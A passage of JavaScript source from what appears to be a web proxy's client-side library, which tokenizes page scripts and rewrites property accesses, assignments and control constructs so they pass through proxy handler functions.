	//   using this long regex, unfortunately.  For example:
	//      } else if (RE.SET_TRAPPED_PROPERTIES[token]) {
	} else if (/^(open|write|writeln|load|eval|setInterval|setTimeout|toString|String|src|currentSrc|href|background|lowsrc|action|formAction|location|poster|URL|url|newURL|oldURL|referrer|baseURI|useMap|longDesc|cite|codeBase|profile|cssText|insertRule|setStringValue|setProperty|backgroundImage|content|cursor|listStyleImage|host|hostname|pathname|port|protocol|search|setNamedItem|innerHTML|outerHTML|outerText|body|parentNode|insertAdjacentHTML|setAttribute|setAttributeNode|getAttribute|nodeValue|value|cookie|domain|frames|parent|top|opener|execScript|execCommand|navigate|showModalDialog|showModelessDialog|addImport|LoadMovie|close|getElementById|getElementsByTagName|appendChild|replaceChild|insertBefore|removeChild|createElement|text|textContent|origin|postMessage|pushState|replaceState|localStorage|sessionStorage|querySelector|querySelectorAll|send|setRequestHeader|withCredentials)$/.test(token)) {
	    _proxy_jslib_does_write= _proxy_jslib_does_write || (token=='write') || (token=='writeln') || (token=='eval') ;
	    if ( newline_since_last_token
		 &&   /^(\)|\]|\+\+|\-\-)$|^([a-zA-Z\$\_\\\d'"]|\.\d|\/..)/.test(last_token)
		 && ! /^(case|delete|do|else|in|instanceof|new|typeof|void|function|var)$/.test(last_token) )
	    {
		out.push(term_so_far) ;
		term_so_far= '' ;
	    }
	    var has_dot= term_so_far.match(RE.DOTSKIPEND) ;
	    term_so_far= term_so_far.replace(RE.DOTSKIPEND, '') ;

	    var next_is_paren= (next_token=='(')  ? 1  : 0 ;

	    if (/^[\{\,]/.test(last_token) && (next_token==':')) {
		out.push(term_so_far, token) ;
		for (i= i_jsin ; i<=i_next_token ; i++) out.push(jsin[i]) ;
		i_jsin= i_next_token+1 ;

		term_so_far= '' ;
		new_last_token= ':' ;

	    } else if (token=='String' && !next_is_paren) {
		if (has_dot) term_so_far+= '.' ;
		term_so_far+= token;
		div_ok= 1;

	    } else if ((i_lt==void 0) && (next_token=='++' || next_token=='--')) {
		op= next_token ;
		i_jsin= i_next_token+1 ;
		if (term_so_far=='') {
		    out.push(' ', (with_level
				      ? (token+"= _proxy_jslib_with_assign_rval(_proxy_jslib_with_objs, '', '"+token+"', '"+op+"', '', "+token+")")
				      : (token+"= _proxy_jslib_assign_rval('', '"+token+"', '"+op+"', '', (typeof "+token+"=='undefined' ? void 0 : " + token+"))") )
			     ) ;
		} else {
		    term_so_far= " _proxy_jslib_assign('', "+term_so_far+", '"+token+"', '"+op+"', '')" ;
		}
		new_last_token= ')' ;

	    } else if (next_token && next_token.match(RE.ASSIGNOP)) {
		op= next_token ;
		estart= i_jsin= i_next_token+1 ;
		eend= i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin, end, 0) ;
		if (i_jsin==void 0) break ;
		new_val= _proxy_jslib_proxify_js_tokens(jsin, estart, eend, 0, with_level) ;
		if (term_so_far=='') {
		    out.push(' ', (with_level
				? (token+"= _proxy_jslib_with_assign_rval(_proxy_jslib_with_objs, '', '"+token+"', '"+op+"', ("+new_val+"), "+token+")")
				: (token+"= _proxy_jslib_assign_rval('', '"+token+"', '"+op+"', ("+new_val+"), (typeof "+token+"=='undefined' ? void 0 : " + token+"))") )
			    )
		} else {
		    term_so_far= " _proxy_jslib_assign('', "+term_so_far+", '"+token+"', '"+op+"', ("+new_val+"))" ;
		}
		new_last_token= ')' ;

	    } else {
		if (term_so_far=='') {
		    term_so_far= (with_level
				  ? (" _proxy_jslib_with_handle(_proxy_jslib_with_objs, '"+token+"', "+token+", "+next_is_paren+", "+in_new_statement+")")
				  : (" _proxy_jslib_handle(null, '"+token+"', "+token+", "+next_is_paren+", "+in_new_statement+")") ) ;
		} else {
		    term_so_far= " _proxy_jslib_handle("+term_so_far+", '"+token+"', '', "+next_is_paren+", "+in_new_statement+")" ;
		}
		new_last_token= ')' ;
	    }


	// Skip these for the JS version-- they require %IN_CUSTOM_INSERTION
	//   etc. and would be rare anyway.  Revisit later if needed.
	//} else if (/^(applets|embeds|forms|ids|layers|anchors|images|links)$/.test(token)) {


	} else if (/^(if|while|for|switch)$/.test(token)) {
	    if (next_token!='(') break ;
	    out.push(term_so_far, token, '(') ;
	    term_so_far= '' ;
	    estart= i_jsin= ++i_next_token ;

	    if (token!='for') {
		eend= i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin, end, 1) ;
		if (i_jsin==void 0 || i_jsin>=end || jsin[i_jsin++]!=')') break ;
		out.push(_proxy_jslib_proxify_js_tokens(jsin, estart, eend, 0, with_level), ')') ;

	    // Must handle e.g. "for (a[b] in c)..." -- very messy.
	    } else {
		while (jsin[i_next_token].skip) i_next_token++ ;
		if (jsin[i_next_token].match(RE.IdentifierName)) {
		    while (jsin[++i_next_token].skip) ;
		    if (jsin[i_next_token]=='in') {
			// normal for(a in b)
			eend= i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin, end, 1) ;
			if (i_jsin==void 0 || i_jsin>=end || jsin[i_jsin++]!=')') break ;
			out.push(_proxy_jslib_proxify_js_tokens(jsin, estart, eend, 0, with_level), ')') ;
		    } else {
			// possible for(expr in b), or for(;;)
			o_p= _proxy_jslib_get_next_js_term(jsin, i_jsin, end) ;
			if (o_p!=void 0) {
			    i_next_token= o_p[3] ;
			    while (jsin[i_next_token].skip) i_next_token++ ;
			}
			if (o_p!=void 0 && jsin[i_next_token]=='in') {
			    // for(expr in b)
			    eend= _proxy_jslib_get_next_js_expr(jsin, ++i_next_token, end, 0) ;
			    if (jsin[eend]!=')') break ;
			    var rval= _proxy_jslib_proxify_js_tokens(jsin, i_next_token, eend, 0, with_level) ;
			    var temp_varname= '_proxy_jslib_temp' + _proxy_jslib_temp_counter++ ;
			    var p_param= jsin[o_p[2]]=='['
				? _proxy_jslib_proxify_js_tokens(jsin, o_p[2]+1, o_p[3]-1, 0, with_level)
				: "'" + jsin[o_p[2]] + "'" ;
			    out.push('var ', temp_varname, ' in ', rval, ') {',
				     '_proxy_jslib_assign("", (',
					 _proxy_jslib_proxify_js_tokens(jsin, o_p[0], o_p[1], 0, with_level),
				     '), (', p_param, '), "=", ', temp_varname, ') ;') ;
			    i_jsin= eend+1 ;   // past ')'
			    while (jsin[i_jsin].skip) i_jsin++ ;
			    if (jsin[i_jsin]!='{') {
				var stmt_start= i_jsin ;
				var stmt_end= _proxy_jslib_get_next_js_expr(jsin, stmt_start, end, 0) ;
				while (jsin[stmt_end]==',')
				    stmt_end= _proxy_jslib_get_next_js_expr(jsin, stmt_end+1, end, 0) ;
				out.push(_proxy_jslib_proxify_js_tokens(jsin, stmt_start, stmt_end, 0, with_level),
					 '; }') ;
				i_jsin= stmt_end ;
			    } else
				i_jsin++ ;
			} else {
			    // for(;;)
			    eend= i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin, end, 1) ;
			    if (i_jsin==void 0 || i_jsin>=end || jsin[i_jsin++]!=')') break ;
			    out.push(_proxy_jslib_proxify_js_tokens(jsin, estart, eend, 0, with_level), ')') ;
			}
		    }
		} else {
		    // another for(;;), not starting with identifier
		    eend= i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin, end, 1) ;
		    if (i_jsin==void 0 || i_jsin>=end || jsin[i_jsin++]!=')') break ;
		    out.push(_proxy_jslib_proxify_js_tokens(jsin, estart, eend, 0, with_level), ')') ;
		}
	    }


	} else if (token=='catch') {
	    out.push(term_so_far, token) ;
	    term_so_far= '' ;
	    if (next_token!='(') break ;
	    estart= i_jsin= i_next_token+1 ;
	    eend= i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin, end, 1) ;
	    if (i_jsin==void 0 || i_jsin>=end || jsin[i_jsin++]!=')') break ;
	    out.push('(') ;
	    for (i= estart ; i<eend ; i++) out.push(jsin[i]) ;
	    out.push(')') ;


	} else if (token=='function') {
	    out.push(term_so_far, token) ;
	    term_so_far= '' ;
	    if (next_token && next_token.match(RE.IdentifierName)) {
		for (i= i_jsin ; i<i_next_token ; i++) out.push(jsin[i]) ;
		funcname= next_token ;
		i_jsin= i_next_token+1 ;
		while (i_jsin<end-1
		       && jsin[i_jsin]=='.' && jsin[i_jsin+1].match(RE.IdentifierName)) {
		    funcname+= jsin[i_jsin] + jsin[i_jsin+1] ;
		    i_jsin+= 2 ;
		}
	    } else {
		funcname= '' ;
	    }
	    if (m2= funcname.match(/^_proxy(\d*)_/))
		funcname= '_proxy' + (m2[1]-0+1) + funcname.replace(/^_proxy(\d*)/, '') ;
	    out.push(funcname) ;
	    i_next_token= i_jsin ;
	    while (i_next_token<end && jsin[i_next_token].skip) i_next_token++ ;
	    for (i= i_jsin+1 ; i<i_next_token ; i++) out.push(jsin[i]) ;
	    if (jsin[i_next_token]!='(') break ;
	    estart= i_jsin= i_next_token+1 ;
	    eend= i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin, end, 1) ;
	    if (i_jsin==void 0 || i_jsin>=end || jsin[i_jsin++]!=')') break ;
	    out.push('(') ;
	    for (i= estart ; i<eend ; i++) out.push(jsin[i]) ;
	    out.push(') {') ;
	    while (i_jsin<end && jsin[i_jsin].skip) i_jsin++ ;
	    if (i_jsin>=end || jsin[i_jsin++]!='{') break ;

	    in_braces++ ;
	    in_func= true ;


	} else if (token=='with') {
	    out.push(term_so_far) ;
	    term_so_far= '' ;
	    skip1= '' ;
	    for (i= i_jsin ; i<i_next_token ; i++) skip1+= jsin[i] ;
	    if (next_token!='(') break ;
	    estart= i_jsin= i_next_token+1 ;
	    eend= i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin, end, 1) ;
	    with_obj= _proxy_jslib_proxify_js_tokens(jsin, estart, eend, 0, with_level) ;
	    if (i_jsin>=end || jsin[i_jsin++]!=')') break ;
	    skip2= '' ;
	    while (i_jsin<end && jsin[i_jsin].skip) skip2+= jsin[i_jsin++] ;
	    if (jsin[i_jsin]=='{') {
		estart= ++i_jsin ;
		eend= i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin, end, 1) ;
		code= '{' + _proxy_jslib_proxify_js_tokens(jsin, estart, eend, 0, with_level+1) + '}' ;
		if (i_jsin>=end || jsin[i_jsin++]!='}') break ;
	    } else {
		estart= i_jsin ;
		eend= i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin, end, 0) ;
		code= _proxy_jslib_proxify_js_tokens(jsin, estart, eend, 0, with_level+1) ;
		while (jsin[i_jsin]==',') {
		    estart= ++i_jsin ;
		    eend= i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin, end, 0) ;
		    code+= ',' + _proxy_jslib_proxify_js_tokens(jsin, estart, eend, 0, with_level+1) ;
		}
	    }
	    out.push('{', with_level  ? ''  : 'var _proxy_jslib_with_objs= [] ;') ;
	    out.push('with', skip1, '(_proxy_jslib_with_objs[_proxy_jslib_with_objs.length]= (', with_obj, '))', skip2, code) ;
	    out.push('; _proxy_jslib_with_objs.length-- ;}') ;
	    new_last_token= ';' ;


	} else if (token=='var' || token=='let') {
	    out.push(term_so_far, token) ;
	    term_so_far= '' ;
	    while (1) {
		estart= i_jsin ;
		eend= i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin, end, 0) ;
		i= estart ;
		while (i<eend && jsin[i].skip) out.push(jsin[i++]) ;
		varname= (i<eend)  ? jsin[i]  : void 0 ;
		if (!varname || !varname.match(RE.IdentifierName)) break OUTER ;
		if (varname && (match= varname.match(/^_proxy(\d*)_/)))
		    varname= '_proxy' + (match[1]-0+1) + varname.replace(/^_proxy(\d*)/, '') ;
		out.push(varname) ;
		i++ ;
		while (i<eend && jsin[i].skip) out.push(jsin[i++]) ;
		eq= (i<eend)  ? jsin[i]  : void 0 ;
		if (eq && !(eq=='=' || eq=='in')) break OUTER ;

		if (eq) out.push(eq, _proxy_jslib_proxify_js_tokens(jsin, i+1, eend, 0, with_level)) ;
		if (i_jsin>=end || jsin[i_jsin]!=',') break ;
		i_jsin++ ;
		out.push(',') ;
	    }


	} else if (token=='new') {
	    out.push(term_so_far) ;
	    term_so_far= '' ;
	    var test_jsin ;

	    if (next_token=='function') {
		term_so_far= 'new function' ;
		i_jsin= i_next_token+1 ;
		while (i_jsin<end && jsin[i_jsin].skip) i_jsin++ ;
		if (i_jsin>=end || jsin[i_jsin++]!='(') break ;
		estart= i_jsin ;
		eend= i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin, end, 1) ;
		if (i_jsin>=end || jsin[i_jsin++]!=')') break ;
		term_so_far+= '(' ;
		for (i= estart ; i<eend ; i++) term_so_far+= jsin[i] ;
		term_so_far+= ')' ;
		while (i_jsin<end && jsin[i_jsin].skip) i_jsin++ ;
		if (i_jsin>=end || jsin[i_jsin++]!='{') break ;
		estart= i_jsin ;
		eend= i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin, end, 1) ;
		if (i_jsin>=end || jsin[i_jsin++]!='}') break ;
		fn_body= _proxy_jslib_proxify_js_tokens(jsin, estart, eend, 0, with_level, 0) ;
		term_so_far+= '{'+fn_body+'}' ;
		new_last_token= '}' ;

	    } else {
		if (next_token=='(') {
		    estart= i_jsin= i_next_token+1 ;
		    eend= i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin, end, 1) ;
		    if (i_jsin>=end || jsin[i_jsin++]!=')') break ;
		} else {
		    estart= i_jsin ;
		    eend= i_jsin= _proxy_jslib_get_next_js_constructor(jsin, i_jsin, end) ;
		}
		new_expr= _proxy_jslib_proxify_js_tokens(jsin, estart, eend, 0, with_level, 1) ;
		while (i_jsin<end && jsin[i_jsin].skip) i_jsin++ ;
		test_jsin= i_jsin+1 ;
		while (test_jsin<end && jsin[test_jsin].skip) test_jsin++ ;
		if (jsin[i_jsin]=='(' && jsin[test_jsin]!=')') {
		    i_jsin++ ;
		    out.push('_proxy_jslib_new(('+new_expr+'), ') ;
		    new_last_token= ',' ;
		} else {
		    if (jsin[i_jsin]=='(' && jsin[test_jsin]==')') i_jsin= test_jsin+1 ;
		    out.push('_proxy_jslib_new('+new_expr+')') ;
		    new_last_token= ')' ;
		}
	    }


	} else if ((token=='return') && !in_func && top_level) {
	    out.push(term_so_far) ;
	    term_so_far= '' ;
	    estart= i_jsin= i_next_token ;
	    eend= i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin, end, 0) ;
	    while (jsin[i_jsin]==',') {
		estart= ++i_jsin ;
		eend= i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin, end, 0) ;
	    }
	    new_expr= estart==eend  ? 'void 0'  : _proxy_jslib_proxify_js_tokens(jsin, estart, eend, 0, with_level) ;
	    out.push('return ((_proxy_jslib_ret= (', new_expr, ')), _proxy_jslib_flush_write_buffers(), _proxy_jslib_ret)') ;


	} else if ((token=='break') || (token=='continue')) {
	    out.push(term_so_far, token) ;
	    term_so_far= '' ;
	    if (next_token.match(RE.IdentifierName)) {
		for (i= i_jsin ; i<=i_next_token ; i++) out.push(jsin[i]) ;
		i_jsin= i_next_token+1 ;
		new_last_token= next_token ;
	    }


	} else if (/^(abstract|boolean|byte|case|char|class|const|debugger|default|delete|do|else|enum|export|extends|final|finally|float|goto|implements|in|instanceof|int|interface|long|native|package|private|protected|return|short|static|synchronized|throw|throws|transient|try|typeof|void|volatile)$/.test(token)) {
	    out.push(term_so_far, token) ;
	    term_so_far= '' ;


	} else if (token.match(RE.IDENTIFIER)) {
	    if (match= token.match(/^\_proxy(\d*)(\_.*)/))
		// the "-0" is to typecast match[1] to a number
		token= '_proxy'+(match[1]-0+1)+match[2] ;

	    if ( newline_since_last_token
		 &&   /^(\)|\]|\+\+|\-\-)$|^([a-zA-Z\$\_\\\d'"]|\.\d|\/..)/.test(last_token)
		 && ! /^(case|delete|do|else|in|instanceof|new|typeof|void|function|var)$/.test(last_token) )
	    {
		out.push(term_so_far) ;
		term_so_far= token ;
	    } else {
		term_so_far+= token ;
	    }


	} else if (token=='.') {
	    term_so_far+= '.' ;


	} else if (token=='(') {
	    _proxy_jslib_does_write= true ;
	    estart= i_jsin ;
	    eend= i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin, end, 1) ;
	    if (i_jsin>=end || jsin[i_jsin++]!=')') break ;
	    term_so_far+= '(' + _proxy_jslib_proxify_js_tokens(jsin, estart, eend, 0, with_level) + ')' ;
	    new_last_token= ')' ;


	} else if (token=='[') {
	    estart= i_jsin ;
	    eend= i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin, end, 1) ;
	    if (i_jsin>=end || jsin[i_jsin++]!=']') break ;
	    if (eend-estart<=1 && ! /\D/.test(jsin[estart])) {
		term_so_far+= '['+(eend!=estart ?jsin[estart] :'')+']' ;
		new_last_token= ']' ;


	    } else {
		sub_expr= _proxy_jslib_proxify_js_tokens(jsin, estart, eend, 0, with_level) ;
		if (term_so_far) {
		    new_last_token= ')' ;

		    // locate next token in jsin, and whether we skip a line terminator
		    i_next_token= i_lt= i_jsin ;
		    while (i_next_token<end && jsin[i_next_token].skip) i_next_token++ ;
		    next_token= (i_next_token<end)  ? jsin[i_next_token]  : void 0 ;
		    while (i_lt<i_next_token && !RE.LINETERMINATOR.test(jsin[i_lt])) i_lt++ ;
		    if (i_lt==i_next_token) i_lt= void 0 ;

		    var next_is_paren= (jsin[i_next_token]=='(')  ? 1  : 0 ;

		    if ((i_lt==void 0) && (next_token=='++' || next_token=='--')) {
			op= next_token ;
			i_jsin= i_next_token+1 ;
			term_so_far= " _proxy_jslib_assign('', "+term_so_far+", ("+sub_expr+"), '"+op+"', '')" ;
		    } else if (next_token && next_token.match(RE.ASSIGNOP)) {
			op= next_token ;
			estart= i_jsin= i_next_token+1 ;
			eend= i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin, end, 0) ;
			new_val= _proxy_jslib_proxify_js_tokens(jsin, estart, eend, 0, with_level) ;
			term_so_far= " _proxy_jslib_assign('', "+term_so_far+", ("+sub_expr+"), '"+op+"', ("+new_val+"))" ;
		    } else {
			term_so_far= " _proxy_jslib_handle("+term_so_far+", ("+sub_expr+"), '', "+next_is_paren+", "+in_new_statement+")" ;
		    }
		} else {
		    term_so_far= '['+sub_expr+']' ;
		    new_last_token= ']' ;
		}
	    }


	// distinguishing between an object literal and a block is messy
	} else if (token=='{' && term_so_far=='' && last_token!=')'
		   && ((last_token==void 0) || last_token.match(RE.PUNCDIVPUNC)
		       || last_token.match(/^(?:case|delete|in|instanceof|new|return|throw|typeof)$/))
		   && (!next_token.match(/^(?:break|case|catch|continue|default|delete|do|else|finally|for|function|if|in|instanceof|new|return|switch|this|throw|try|typeof|var|void|while|with)/))
		   && (next_token.match(RE.IDENTIFIER) || next_token.match(RE.STRINGLITERAL) || next_token.match(RE.NUMERICLITERAL) || (next_token=='}') ) ) {
	    term_so_far= '{' ;
	    if (next_token!='}') {
		i_jsin= i_next_token+1 ;
		while (i_jsin<end && jsin[i_jsin].skip) i_jsin++ ;
		if (jsin[i_jsin]==':') {
		    term_so_far+= next_token + ':' ;
		    estart= i_jsin+1 ;
		    eend= i_jsin= _proxy_jslib_get_next_js_expr(jsin, estart, end, 0) ;
		    term_so_far+= _proxy_jslib_proxify_js_tokens(jsin, estart, eend, 0, with_level) ;
		    while (jsin[i_jsin]==',') {
			i_jsin++ ;
			term_so_far+= ',' ;
			while (i_jsin<end && jsin[i_jsin].skip) i_jsin++ ;
			if (jsin[i_jsin]=='}') break ;
			if (!(jsin[i_jsin].match(RE.IDENTIFIER) || jsin[i_jsin].match(RE.STRINGLITERAL) || jsin[i_jsin].match(RE.NUMERICLITERAL)))
			    break OUTER ;
			var prop_name= jsin[i_jsin++] ;
			if (match= prop_name.match(/^\_proxy(\d*)(\_.*)/))
			    prop_name= '_proxy'+(match[1]-0+1)+match[2] ;
			term_so_far+= prop_name ;
			while (i_jsin<end && jsin[i_jsin].skip) i_jsin++ ;
			if (jsin[i_jsin++]!=':')  break OUTER ;
			term_so_far+= ':' ;
			estart= i_jsin ;
			eend= i_jsin= _proxy_jslib_get_next_js_expr(jsin, estart, end, 0) ;
			term_so_far+= _proxy_jslib_proxify_js_tokens(jsin, estart, eend, 0, with_level) ;
		    }
		    if (jsin[i_jsin++]!='}') break OUTER;
		    term_so_far+= new_last_token= '}' ;

		} else {
		    out.push(term_so_far, next_token) ;
		    term_so_far= '' ;
		}

	    } else {
		i_jsin= i_next_token+1 ;
		term_so_far+= new_last_token= '}' ;
	    }



	} else if (RE.PUNCDIVPUNC.test(token)) {
	    out.push(term_so_far, token) ;
	    term_so_far= '' ;

	} else {
	    // shouldn't get here
	}

	if (token) {
	    last_token= new_last_token  ? new_last_token  : token ;
	    newline_since_last_token= false ;
	}

    }

    out.push(term_so_far) ;

    if (top_level && _proxy_jslib_does_write) {
	out.push(' ;\n_proxy_jslib_flush_write_buffers() ;') ;
    }


    return out.join('') ;



    // This takes a token array segment as input, and returns the start and
    //   end index of the object and final property of the next JS term.  The
    //   property includes "[]" if that's what it's surrounded with.
    function _proxy_jslib_get_next_js_term(jsin, start, end) {
	var oend, pstart, pend ;
	var i_jsin= start ;

	while (i_jsin<end && jsin[i_jsin].skip) i_jsin++ ;
	if (i_jsin>=end || (   !jsin[i_jsin].match(RE.IDENTIFIER)
			    && !jsin[i_jsin].match(/^[\[\{\(]$/)   ) )
	    return void 0 ;
	if (jsin[i_jsin]=='[') {
	    i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin+1, end, 1) ;
	    if (jsin[i_jsin]!=']') return void 0 ;
	    oend= pstart= pend= ++i_jsin ;
	} else if (jsin[i_jsin]=='{') {
	    i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin+1, end, 1) ;
	    if (jsin[i_jsin]!='}') return void 0 ;
	    oend= pstart= pend= ++i_jsin ;
	} else if (jsin[i_jsin]=='(') {
	    i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin+1, end, 1) ;
	    if (jsin[i_jsin]!=')') return void 0 ;
	    oend= pstart= pend= ++i_jsin ;
	} else {
	    oend= pstart= i_jsin ;
	    pend= ++i_jsin ;
	}

	while (i_jsin<end && jsin[i_jsin].skip) i_jsin++ ;
	while (i_jsin<end && (jsin[i_jsin]=='.' || jsin[i_jsin]=='(' || jsin[i_jsin]=='[')) {

	    if (jsin[i_jsin]=='.') {
		oend= i_jsin++ ;
		while (i_jsin<end && jsin[i_jsin].skip) i_jsin++ ;
		if (i_jsin>=end || !jsin[i_jsin].match(RE.IDENTIFIER)) return void 0 ;
		pstart= i_jsin++ ;
		pend= i_jsin ;

	    } else if (jsin[i_jsin]=='[') {
		oend= pstart= i_jsin ;
		i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin+1, end, 1) ;
		if (i_jsin==void 0 || i_jsin>=end || jsin[i_jsin++]!=']') return void 0 ;
		pend= i_jsin ;

	    } else if (jsin[i_jsin]=='(') {
		i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin+1, end, 1) ;
		if (i_jsin==void 0 || i_jsin>=end || jsin[i_jsin++]!=')') return void 0 ;
		oend= pstart= pend= i_jsin ;
	    }
	    while (i_jsin<end && jsin[i_jsin].skip) i_jsin++ ;
	}
	return [start, oend, pstart, pend] ;
    }



    // Similar to _proxy_jslib_get_next_js_term(), but for "new" statements.
    function _proxy_jslib_get_next_js_constructor(jsin, start, end) {
	var c= [], t, skip= [], op, estart, eend ;
	var i_jsin= start ;

	while (i_jsin<end && jsin[i_jsin].skip) i_jsin++ ;
	if (i_jsin>=end || !jsin[i_jsin].match(RE.IDENTIFIER)) return void 0 ;
	i_jsin++ ;

	while (i_jsin<end && jsin[i_jsin].skip) i_jsin++ ;
	while (i_jsin<end && (jsin[i_jsin]=='.' || jsin[i_jsin]=='[')) {
	    if (jsin[i_jsin]=='.') {
		i_jsin++ ;
		while (i_jsin<end && jsin[i_jsin].skip) i_jsin++ ;
		if (i_jsin>=end || !jsin[i_jsin].match(RE.IDENTIFIER)) return void 0 ;
		i_jsin++ ;
	    } else if (jsin[i_jsin]=='[') {
		estart= ++i_jsin ;
		eend= i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin, end, 1) ;
		if (i_jsin==void 0 || i_jsin>=end || jsin[i_jsin++]!=']') return void 0 ;
	    }
	    while (i_jsin<end && jsin[i_jsin].skip) i_jsin++ ;
	}
	return i_jsin ;
    }

}


// This takes a token array segment as input, and returns an index
//   to the token following the end of the next expression in the input.
// We can't nest this because it's called from outside _proxy_jslib_proxify_js() .
function _proxy_jslib_get_next_js_expr(jsin, start, end, allow_multiple, is_new) {
    var p= [], element, last_token, i, expr_block_state ;

    var i_jsin= start ;
    while (i_jsin<end) {
	element= jsin[i_jsin] ;

	if (!allow_multiple && p.length==0 && element=='function') expr_block_state= 1 ;

	switch(element) {

	    case ';':
	    case ',':
		if (!allow_multiple && p.length==0) return i_jsin ;
		break ;

	    case '\x0a':
	    case '\x0d':
		if (!allow_multiple && p.length==0) {
		    i= i_jsin+1 ;
		    while (i<end && jsin[i].skip) i++ ;
		    if (     /^(\)|\]|\+\+|\-\-)$|^([a-zA-Z\$\_\\\d'"]|\.\d|\/..)/.test(last_token)
			&& ! /^(case|delete|do|else|in|instanceof|new|typeof|void|function|var)$/.test(last_token)
			&&   _proxy_jslib_RE.IDENTIFIER.test(jsin[i]) )
		    {
			return i_jsin ;
		    }
		    if (expr_block_state==3
			&& (jsin[i]=='{'
			    || !(jsin[i].match(_proxy_jslib_RE.PUNCDIVPUNC) || jsin[i]=='instanceof') ) )
		    {
			return i_jsin ;
		    }
		}
		break ;

	    case '{':
		i= i_jsin+1 ;
		while (i<end && jsin[i].skip) i++ ;
		if (!allow_multiple && p.length==0
		    && (expr_block_state==1 
			|| jsin[i].match(_proxy_jslib_RE.IDENTIFIER)
			|| jsin[i].match(_proxy_jslib_RE.STRINGLITERAL)
			|| jsin[i].match(_proxy_jslib_RE.NUMERICLITERAL)
			|| jsin[i]=='}' ) )
		{
		    expr_block_state= 2 ;
		}
	    case '(':
	    case '[':
	    case '?':
		if (is_new && (p.length==0) && element=='(') return i_jsin ;
		p.push(element) ;
		break ;

	    case ')':
	    case ']':
	    case '}':
	    case ':':
		if (p.length==0) return i_jsin ;
		if (p.length>0 && !(element==':' && p[p.length-1]!='?')) p.length-- ;
		//if (element=='}' && p.length==0 && !allow_multiple) return i_jsin+1 ;
		if (!allow_multiple && p.length==0 && element=='}' && expr_block_state==2)
		    expr_block_state= 3 ;
		break ;
	}

	if (!element.skip) {
	    last_token= element ;
	}

	i_jsin++ ;
    }

    return p.length==0  ? i_jsin  : void 0 ;
}



// This takes a string as input, and returns two strings as output.
function _proxy_jslib_separate_last_js_statement(s) {
    var rest, last, jsin, i, i_jsin, estart, eend, rest_end= 0 ;
    var RE= _proxy_jslib_RE ;

    jsin= _proxy_jslib_tokenize_js(s) ;

    estart= i_jsin= 0 ;
    eend= i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin, jsin.length, 0) ;
    while (eend>estart || eend<jsin.length) {
	while (i_jsin<jsin.length && jsin[i_jsin].skip) i_jsin++ ;

	// peek ahead to see if we got the last statement in jsin
	i= i_jsin ;
	while (i<jsin.length && (jsin[i]==';' || jsin[i].skip)) i++ ;
	if (i==jsin.length) break ;

	if ((jsin[i_jsin]).match(RE.STATEMENTTERMINATOR)) {
	    rest_end= ++i_jsin ;
	} else {
	    if (jsin[i_jsin]==',') i_jsin++ ;
	}

	estart= i_jsin ;
	eend= i_jsin= _proxy_jslib_get_next_js_expr(jsin, i_jsin, jsin.length, 0) ;
    }

    rest= jsin.slice(0, rest_end).join('') ;
    last= jsin.slice(rest_end, jsin.length).join('') ;
    return [rest, last] ;
}



// This takes a string as input, and returns a token array as output.
// If not for the "/" problem and the lack of \G in JavaScript, this whole
//   thing could be done in one blazing statement, if the regex below was
//   global and started with "\G":
//       out= s.match(_proxy_jslib_RE.InputElementG) ;
function _proxy_jslib_tokenize_js(s) {
    var out= [], match, element, token, div_ok, last_lastIndex= 0, conditional_state, conditional_stack_size, p_count ;
    var RE_InputElementDivG= _proxy_jslib_RE.InputElementDivG ;
    var RE_InputElementRegExpG= _proxy_jslib_RE.InputElementRegExpG ;

    while (1) {
	if (div_ok) {
	    if (!(match= RE_InputElementDivG.exec(s))) break ;
	    if (match.index!= last_lastIndex) break ;
	    last_lastIndex= RE_InputElementRegExpG.lastIndex= RE_InputElementDivG.lastIndex ;
	} else {
	    if (!(match= RE_InputElementRegExpG.exec(s))) break ;
	    if (match.index!= last_lastIndex) break ;
	    last_lastIndex= RE_InputElementDivG.lastIndex= RE_InputElementRegExpG.lastIndex ;
	}
	element= match[0] ;
	token= match[1] ;

	// if it's not a token, flag it as skippable
	if (!token) {
	    element= new String(element) ;
	    element.skip= true ;


	// pain setting div_ok to false after "if ()", etc.
	// without that requirement, half of this routine would go away.
	} else if ((token=='if') || (token=='while') || (token=='for') || (token=='switch')) {
	    conditional_state= 1 ;
	    conditional_stack_size= p_count ;

	} else if (token=='(') {
	    p_count++ ;
	    if (conditional_state==1) conditional_state= 2 ;

	} else if (token==')') {
	    p_count-- ;
	    if ((conditional_state==2) && (p_count==conditional_stack_size))
		conditional_state= 3 ;
	}


	out.push(element) ;

	if (token) {
	    if (conditional_state==3) {
		div_ok= 0 ;
		conditional_state= 0 ;
	    } else {
		div_ok= /^(\)|\]|\+\+|\-\-)$|^([a-zA-Z\$\_\\\d'"]|\.\d|\/..)/.test(token)
		    && !/^(case|delete|do|else|in|instanceof|new|return|throw|typeof|void)$/.test(token) ;
	    }
	}
    }

    RE_InputElementDivG.lastIndex= RE_InputElementRegExpG.lastIndex= 0 ;
    return out ;
}



function _proxy_jslib_set_RE() {
    if (!_proxy_jslib_RE) {  // saves time for multiple calls
	var RE= {} ;

